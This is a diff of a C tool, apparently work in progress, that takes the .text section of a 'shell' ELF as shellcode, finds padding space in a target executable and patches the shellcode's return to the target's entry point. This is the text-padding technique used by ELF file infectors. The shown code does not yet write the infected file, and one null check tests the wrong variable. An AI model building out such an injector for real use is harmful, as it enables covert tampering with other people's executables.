@@ -1,6 +1,7 @@
 #include "util.h"
 #include "elffile.h"
 #include <fcntl.h>
+#include <stdint.h>
 #include <stdio.h>
 #include <string.h>
 #include <unistd.h>
@@ -21,7 +22,7 @@ int main(int argc, char *argv[])
 {
     /* target file */
     char *filename = parse_args(argc, argv);
-    Elf *target = elf_construct(filename);
+    Elf *target = elf_constructor(filename);
     if(target == NULL){
         goto err;
     }
@@ -36,7 +37,7 @@ int main(int argc, char *argv[])
 
     /* shellcode */
     char *shellcode_name = "shell";
-    Elf *shellcode = elf_construct(shellcode_name);
+    Elf *shellcode = elf_constructor(shellcode_name);
     if(shellcode == NULL) {
         goto err1;
     }
@@ -50,11 +51,25 @@ int main(int argc, char *argv[])
     }
 
     shellcode->ParseHeaders(shellcode);
+    int index = shellcode->FindSectionIndexByName(shellcode,    \
+            ".text");
+    if(index < 0){
+        goto err2;
+    }
+    struct shellcode *_shellcode = shellcode->ExtractSection(shellcode,  \
+            index);
+    if(shellcode == NULL){
+        goto err2;
+    }
 
     target->ParseHeaders(target);
-    struct text_padding_info = {
-        .free_space = 
-    }
+    struct text_padding_info padding_info = {
+        .freespace = shellcode->m_shdr[index].sh_size
+    };
+    target->FindFreeSpace(target, &padding_info);
+
+    shellcode->PatchRetAddress(shellcode, target->m_ehdr->      \
+            e_entry);
 err2:
     elf_destructor(shellcode);
 err1:
